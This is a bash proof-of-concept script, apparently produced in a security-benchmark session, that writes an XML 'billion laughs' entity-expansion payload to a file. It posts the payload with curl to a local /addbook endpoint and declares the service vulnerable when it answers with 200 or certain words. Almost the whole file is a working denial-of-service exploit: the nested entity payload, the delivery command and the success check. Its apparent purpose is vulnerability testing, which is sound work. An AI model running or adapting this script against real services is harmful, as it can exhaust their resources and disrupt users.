#!/bin/bash
# POC: XML Billion Laughs DoS Attack (v2) - Uses proper form parameter encoding matching the vulnerable endpoint's expected input format
# Target: ./repo
# Created: 2025-12-01T16:04:44.042Z
# Session: benchmark-XBEN-096-24-minc08hf

# XML Billion Laughs (XML Bomb) DoS Attack POC - Version 2
# Corrected to send XML via proper form parameter

TARGET_URL="${1:-http://localhost:5000/addbook}"
OUTPUT_FILE="/tmp/xxe_billion_attack.xml"

# Create the XML billion laughs payload
cat > "$OUTPUT_FILE" << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<book>&lol5;</book>
EOF

echo "[*] XML Billion Laughs DoS Attack POC (Version 2)"
echo "[*] Target: $TARGET_URL"
echo "[*] Payload file: $OUTPUT_FILE"
echo ""

# Show payload info
echo "[*] Payload Size: $(wc -c < "$OUTPUT_FILE") bytes"
echo "[*] This small payload expands to approximately 30KB when parsed"
echo ""

# Display the actual payload
echo "[*] XML Payload:"
cat "$OUTPUT_FILE"
echo ""
echo ""

# Attempt to send the payload using proper form encoding (as shown in evidence)
echo "[*] Sending payload using form parameter 'xml' (--data-urlencode)..."
echo "[*] Command: curl -s -X POST '$TARGET_URL' --data-urlencode 'xml@$OUTPUT_FILE'"
echo ""

START_TIME=$(date +%s%N)
RESPONSE=$(curl -s -X POST "$TARGET_URL" --data-urlencode "xml@$OUTPUT_FILE" -w "\n%{http_code}" 2>&1)
END_TIME=$(date +%s%N)

# Extract HTTP status code (last line)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

# Calculate response time in milliseconds
RESPONSE_TIME=$(( (END_TIME - START_TIME) / 1000000 ))

echo "[*] Response Time: ${RESPONSE_TIME}ms"
echo "[*] HTTP Status Code: $HTTP_CODE"
echo ""

echo "[*] Server Response:"
echo "$BODY"
echo ""

# Check if vulnerability was triggered
if echo "$BODY" | grep -qE "(successfully|append|book)"; then
    echo "[+] VULNERABILITY CONFIRMED!"
    echo "[+] Server accepted and processed the exponentially-expanding entity payload"
    echo "[+] The server expanded the XML entities without proper entity expansion restrictions"
    echo "[+] Attack successful - server is vulnerable to Billion Laughs DoS"
    exit 0
elif [ "$HTTP_CODE" = "200" ]; then
    echo "[+] VULNERABILITY LIKELY CONFIRMED!"
    echo "[+] Server returned 200 OK - entities were processed"
    exit 0
else
    echo "[-] Response indicates server may have rejected the request"
    echo "[-] HTTP Status: $HTTP_CODE"
    exit 1
fi